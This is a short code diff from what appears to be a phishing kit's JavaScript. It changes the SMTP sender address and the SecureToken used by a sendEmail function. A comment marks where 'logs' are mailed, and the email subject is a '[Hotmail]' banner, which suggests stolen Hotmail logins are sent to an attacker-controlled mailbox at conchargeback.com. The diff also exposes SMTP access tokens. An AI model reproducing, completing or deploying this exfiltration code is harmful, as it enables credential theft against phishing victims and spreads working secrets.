@@ -1,5 +1,5 @@
   var smtp_host = 'smtp.conchargeback.com';
-  var smtp_username = 'logic@conchargeback.com';
+  var smtp_username = 'recovery@conchargeback.com';
 
   //Enter were logs will go here
   var log_email = 'logic@conchargeback.com'
@@ -218,7 +218,7 @@ function sendEmail(to,message) {
   // Host: smtp_host,
   // Username : smtp_username,
   // Password : smtp_password,
-  SecureToken: 'f0738104-a88c-4901-a7d2-88873492e86f',
+  SecureToken: '046ee9ea-a788-458f-9ea0-52a5614b569b',
   To : to,
   From : smtp_username,
   Subject : '==============+ [Hotmail] +================',
